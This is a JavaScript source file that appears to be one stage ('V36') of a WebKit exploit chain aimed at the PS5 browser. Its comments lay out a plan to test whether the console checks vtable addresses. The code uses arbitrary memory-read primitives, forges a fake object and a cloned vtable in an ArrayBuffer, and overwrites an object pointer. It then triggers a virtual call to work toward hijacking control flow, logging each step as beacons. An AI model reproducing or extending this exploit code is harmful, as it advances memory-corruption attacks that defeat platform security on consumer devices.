// V36 Patch: The Address-Validation Discriminator (council-approved)
//
// THE HYPOTHESIS: address-based vcall validation (CFI-like). The PS5 WebKit
// build tree contains Clang CFI/LTO machinery with PlayStation ignorelists.
// If the console validates the vtable's ADDRESS POINT (not contents), any
// fake vtable in our ArrayBuffer is rejected at the FIRST virtual call
// (slot 6, ref()) - explaining all 5 fake-vtable crashes AND d0a's return
// (real VP in module rodata).
//
// THE FALSIFIABLE SET: V36p RETURN, V36R CRASH (address validation live)
//                      V36p RETURN, V36R RETURN (address validation dead)
//
// ARMS (?arm=):
//   v36p (FIRST RUN): the head copy + the REAL VP.
//     head [FB-0x20, FB+0x28) = 0x48 bytes -> S+0x50..S+0x98
//       B'=S+0x50 (primary vptr copied), refcount N at S+0x68 (copied real,
//       gate N>=1), C'=S+0x70 with the copied REAL VP at C'+0x00 (from the
//       head itself - no patch), m_backing at S+0x80, promise at S+0x88,
//       bool at S+0x90.
//     impl.m_ptr = C' = S+0x70. The real ref/deref/fontStateChanged thunks
//     operate on the copied head: refcount N -> N+1 -> N per round (safe
//     even at N=1). fontStateChanged: thunk -> B' -> m_backing=*(S+0x80)
//     = the copied real backing, promise=*(S+0x88) = the copied real promise
//     -> Loading: break; Failure: isFulfilled(real)=true -> skip -> return.
//     EXPECT RETURN. Witness: refcount-after == N (balanced).
//
//   v36r (SECOND RUN, only if v36p returns): the ADDRESS-ONLY discriminator.
//     Same head copy + clone the ENTIRE real vtable [VP-0x10, VP+0x40) =
//     0x50 bytes (negatives + 8 slots, byte-identical contents) ->
//     S+0x98..S+0xE8. Patch ONLY the vptr: C'+0x00 (S+0x70) = S+0xA8.
//     Contents identical to the real vtable; address = our buffer.
//     vtable[-2] at S+0x98 = the real offset-to-top (-32, copied)
//     vtable[-1] at S+0xA0 = the real typeinfo (0, copied)
//     slots at S+0xA8..S+0xE8 = the real entries (copied)
//     Alignment note: S = 0 (mod 0x80) always observed; VP = 0x28 (mod 0x80)
//     always observed -> S+0xA8 = 0x28 (mod 0x80) = VP's alignment -> the
//     alignment confound is naturally removed. Beacon it, don't gate it.
//     RETURN -> address validation dead, the controlled-vtable baseline
//     exists. CRASH -> the arbitrary-fake-vtable route is probably blocked;
//     pivot toward real-vtable-only dispatch.
//
//   wr6 (THIRD RUN, only if v36r returns): the POSITIVE slot-3 witness.
//     Same as v36r + patch the CLONED slot 3 (S+0xC0) = the real slot-6
//     entry (the ref() thunk, at clone offset S+0xD8). Each round then
//     performs an EXTRA real ref() through the controlled slot-3 position:
//       round 1: slot6 ref N->N+1; slot3 ref N+1->N+2; slot7 deref ->N+1
//       round 2: -> N+2; -> N+3; -> N+2
//     FINAL COPIED REFCOUNT = N+2 (vs N for the v36r control), readable
//     via sv.getUint32(0x68,true) directly (no post-craft readAt needed).
//     Strong positive evidence the chosen slot-3 entry loaded and executed
//     TWICE. NOT arbitrary PC control. ARM64 AAPCS64: extra args in
//     registers, callee-cleaned - no stack mismatch.
//
// THE POISON LAW: every readAt poisons the face +0x30..0x67. ALL readAt
// early -> craft LAST (+0x58 last) -> NO readAt -> load -> post reads.

/* ==== V36: THE ADDRESS-VALIDATION DISCRIMINATOR ==== */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V36-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      var ARM=(function(){var m=/[?&]arm=(v36p|v36r|wr6)/.exec(location.search);return m?m[1]:'v36p';})();
      bs('V36-ARM='+ARM);

      /* ---- STEP 1: ALL readAt FIRST ---- */
      var promiseAddr=qAt(readAt(FB+0x18n,8),0);
      bs('V36-PROMISE-ADDR='+hex(promiseAddr));

      /* THE HEAD READ: [FB-0x20, FB+0x28) = the complete object */
      var headH=readAt(FB-0x20n,0x48);
      bs('V36-HEAD='+headH);

      /* THE VTABLE CLONE READ (v36r/wr6 only): [VP-0x10, VP+0x40) */
      var vtH='';
      if(ARM!=='v36p'){
        vtH=readAt(VP-0x10n,0x50);
        bs('V36-VTCLONE='+vtH);
      }

      var promiseBefore=readAt(promiseAddr,0x30);
      bs('V36-PROMISE-BEFORE='+promiseBefore);

      bs('V36-SIBLING-SCAN');
      var sib=0n, sibBk=0n;
      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
        var q0h=readAt(sa,8);
        if(qAt(q0h,0)===VP){
          var bkH=readAt(sa+0x10n,8);
          var bk=qAt(bkH,0);
          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
        }
      }
      if(sibBk===0n){bs('V36-NO-SIBLING');verd('err','V36 no sibling');throw 'no sibling';}
      bs('V36-SIBLING='+hex(sib)+'-backing='+hex(sibBk));

      var timerH=readAt(sibBk+0x88n,0x38);
      bs('V36-TIMER-BORROWED='+timerH);

      /* ---- STEP 2: build the FORGE ---- */
      bs('V36-FORGE-BUILD');

      /* impl: L2 byte-copy, m_ptr = C' = S+0x70 (the head copy's Client) */
      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
      dvSetBig(sv,0x08,S+0x70n);
      bs('V36-IMPL-rc='+sv.getUint32(0x00,true)+'-m_ptr='+hex(dvGetBig(sv,0x08)));

      /* metadata + buckets (same as the proven ladder) */
      sv.setUint32(0x20,0,true); sv.setUint32(0x24,1,true);
      sv.setUint32(0x28,3,true); sv.setUint32(0x2C,4,true);
      dvSetBig(sv,0x30,S); dvSetBig(sv,0x38,0n); dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);

      /* THE HEAD COPY: 0x48 bytes from [FB-0x20) -> S+0x50..0x98 */
      for(var hc=0;hc<0x48;hc++)sv.setUint8(0x50+hc,parseInt(headH.substr(hc*2,2),16));
      /* the copied refcount N (at B'+0x18 = S+0x68) and the copied vptr
       * (at C' = S+0x70) - direct reads for the gates */
      var headN=sv.getUint32(0x68,true);
      var headVptr=dvGetBig(sv,0x70);
      bs('V36-HEAD-rcN='+headN+'-vptr='+hex(headVptr));

      /* v36r/wr6: THE VTABLE CLONE + the vptr patch */
      if(ARM!=='v36p'){
        /* clone 0x50 bytes from [VP-0x10) -> S+0x98..0xE8 */
        for(var vc=0;vc<0x50;vc++)sv.setUint8(0x98+vc,parseInt(vtH.substr(vc*2,2),16));
        /* patch the vptr: C'+0x00 = S+0xA8 (the cloned vtable's address) */
        dvSetBig(sv,0x70,S+0xA8n);
        /* beacon the clone's negatives + slots (direct reads) */
        bs('V36-VT-ot='+hex(dvGetBig(sv,0x98))+'-ti='+hex(dvGetBig(sv,0xA0)));
        bs('V36-VT-s3='+hex(dvGetBig(sv,0xC0))+'-s6='+hex(dvGetBig(sv,0xD8))+'-s7='+hex(dvGetBig(sv,0xE0)));
        /* wr6: patch the CLONED slot 3 = the real slot-6 entry (the ref() thunk) */
        if(ARM==='wr6'){
          var realSlot6=dvGetBig(sv,0xD8);
          dvSetBig(sv,0xC0,realSlot6);
          bs('V36-WR6-slot3-patched='+hex(dvGetBig(sv,0xC0))+'-expect-N+2-final');
        }
      }

      bs('V36-FORGE-BUILT-arm='+ARM);

      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ---- STEP 3: craft the FACE (LAST; no readAt after) ---- */
      bs('V36-FACE-CRAFT');
      for(var sz=0x28;sz<=0x57;sz++)hitBuf[sz]=0;
      for(var c2=0x60;c2<=0x67;c2++)hitBuf[c2]=0;
      hitBuf[0x82]=0; hitBuf[0x83]=1; hitBuf[0x87]=1;
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);
      for(var hz=0x98;hz<0xA8;hz++)hitBuf[hz]=0;
      for(var hz2=0xA8;hz2<0xB0;hz2++)hitBuf[hz2]=0;

      /* ---- STEP 4: install ---- */
      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);

      /* ---- STEP 5: GATES (direct views only) ---- */
      var gatesOK=true;

      /* G1 metadata */
      var g1hex='';for(var g1=0;g1<16;g1++)g1hex+=('0'+sv.getUint8(0x20+g1).toString(16)).slice(-2);
      if(g1hex!=='00000000010000000300000004000000'){gatesOK=false;bs('V36-G1-FAIL');}
      else bs('V36-G1-meta-OK');

      /* G2 install */
      var g2=0n;for(var g2b=0;g2b<8;g2b++)g2|=BigInt(hitBuf[0x58+g2b])<<BigInt(g2b*8);
      if(g2!==(S+0x30n)){gatesOK=false;bs('V36-G2-FAIL');}else bs('V36-G2-install-OK');

      /* G3 counters / G4 sources */
      var g3ok=true,g4ok=true;
      for(var g3=0x60;g3<0x68;g3++)if(hitBuf[g3]!==0)g3ok=false;
      for(var g4=0x48;g4<0x58;g4++)if(hitBuf[g4]!==0)g4ok=false;
      if(!g3ok){gatesOK=false;bs('V36-G3-FAIL');}
      if(!g4ok){gatesOK=false;bs('V36-G4-FAIL');}
      if(g3ok&&g4ok)bs('V36-G3G4-zero-OK');

      /* G5 status/timer */
      var g5v=0n;for(var q9=0;q9<8;q9++)g5v|=BigInt(hitBuf[0x90+q9])<<BigInt(q9*8);
      var g5t=0n;for(var q10=0;q10<8;q10++)g5t|=BigInt(hitBuf[0xB0+q10])<<BigInt(q10*8);
      if(!(hitBuf[0x82]===0&&hitBuf[0x87]===1&&g5v!==0n&&g5t!==0n)){gatesOK=false;bs('V36-G5-FAIL');}
      else bs('V36-G5-timer-OK');

      /* GH: the head gates - refcount N>=1 + the vptr */
      if(!(headN>=1)){gatesOK=false;bs('V36-GH-FAIL-rcN='+headN);}
      else bs('V36-GH-rcN='+headN+'-OK');
      if(ARM==='v36p'){
        if(headVptr!==VP){gatesOK=false;bs('V36-GH-FAIL-vptr='+hex(headVptr)+'-expectVP='+hex(VP));}
        else bs('V36-GH-vptr=REAL-VP-OK');
      }else{
        if(headVptr!==(S+0xA8n)){gatesOK=false;bs('V36-GH-FAIL-vptr='+hex(headVptr));}
        else bs('V36-GH-vptr=clone-OK');
        /* the clone's negatives gate: offset-to-top == -32, typeinfo == 0 */
        if(dvGetBig(sv,0x98)!==0xFFFFFFFFFFFFFFE0n){gatesOK=false;bs('V36-GH-FAIL-ot='+hex(dvGetBig(sv,0x98)));}
        if(dvGetBig(sv,0xA0)!==0n){gatesOK=false;bs('V36-GH-FAIL-ti='+hex(dvGetBig(sv,0xA0)));}
        else bs('V36-GH-negatives-OK');
        /* the alignment beacon (informational, not gating - uncontrollable) */
        var sMod80=Number(BigInt(S)&0x7Fn), vpMod80=Number(VP&0x7Fn), cMod80=Number((S+0xA8n)&0x7Fn);
        bs('V36-ALIGN-S='+sMod80+'-VP='+vpMod80+'-clone='+cMod80+(cMod80===vpMod80?'-MATCH':'-MISMATCH'));
      }

      /* GI: impl.m_ptr == S+0x70 */
      if(dvGetBig(sv,0x08)!==(S+0x70n)){gatesOK=false;bs('V36-GI-FAIL');}
      else bs('V36-GI-impl-mptr-OK');

      if(!gatesOK){
        bs('V36-GATE-FAIL-ABORT-NO-LOAD');
        verd('err','V36 gate fail');
      }else{
        bs('V36-GATES-ALL-OK');

        /* ---- STEP 6: THE DISPATCH ---- */
        bs('V36-LOAD-PRE');
        var loadReturned=false;
        try{
          faces[zi].load();
          loadReturned=true;
          bs('V36-LOAD-RETURNED');
        }catch(e){
          bs('V36-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
        }

        /* ---- STEP 7: THE WITNESS ---- */
        bs('V36-WIT-status='+hitBuf[0x82]+'-opcount='+(hitBuf[0x60]|(hitBuf[0x61]<<8))+'-rc-after='+sv.getUint32(0x68,true)+'-rc-before='+headN);
        try{bs('V36-JS-STATUS='+faces[zi].status);}catch(e){bs('V36-JS-STATUS-ERR');}

        /* the wr6 verdict: rc-after == N+2 = the slot-3 ref() executed twice */
        if(ARM==='wr6'&&loadReturned){
          var rcAfter=sv.getUint32(0x68,true);
          if(rcAfter===headN+2)bs('V36-WR6-WITNESS-rc=N+2-SLOT3-EXECUTED-TWICE');
          else if(rcAfter===headN)bs('V36-WR6-rc=BASELINE-slot3-did-NOT-execute');
          else bs('V36-WR6-rc=UNEXPECTED='+rcAfter);
        }

        /* forge diff */
        var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
        var diffs=[];
        for(var wq=0;wq<0x100;wq+=8){
          var cur=0n,old=0n;
          for(var wb=0;wb<8;wb++){
            cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
            old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
          }
          if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
        }
        if(diffs.length)bs('WIT-V36-FORGE-WRITE-'+diffs.slice(0,10).join('|'));
        else bs('WIT-V36-FORGE-nowrite');

        for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
        bs('V36-RESTORED');

        if(loadReturned){
          verd('ok','V36 '+ARM+' RETURNED');
          bs('V36-DONE-'+ARM+'-RETURNED');
        }else{
          verd('err','V36 '+ARM+' crashed');
          bs('V36-DONE-'+ARM+'-CRASHED');
        }
      }

    }else bs('V36-SKIP-bad-idx');
  }else bs('V36-SKIP-missing-data');
}catch(e36){bs('V36-ERR-'+String(e36&&e36.message?e36.message:'?'));}
/* ==== V36 END ==== */